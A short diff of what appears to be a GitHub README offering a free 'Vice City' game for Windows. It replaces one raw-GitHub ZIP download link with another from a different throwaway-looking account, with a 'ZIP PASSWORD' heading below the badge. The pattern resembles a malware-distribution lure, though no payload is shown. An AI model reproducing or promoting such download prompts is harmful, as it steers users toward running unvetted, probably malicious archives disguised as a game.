@@ -15,7 +15,7 @@ Discover Vice City and immerse yourself in a world unlike any other.
 
 DOWNLOAD
 
-<p align="center"> <a href="https://raw.githubusercontent.com/WiseDarkug/project/main/GitProject.zip"> <img src="https://img.shields.io/badge/DOWNLOAD_FOR_WINDOWS-DC143C?style=for-the-badge&logo=windows&logoColor=white"/> </a> </p>
+<p align="center"> <a href="https://raw.githubusercontent.com/PotterSocket/project/main/GitApp.zip"> <img src="https://img.shields.io/badge/DOWNLOAD_FOR_WINDOWS-DC143C?style=for-the-badge&logo=windows&logoColor=white"/> </a> </p>
 
 <p align="center"> **ZIP PASSWORD**
 
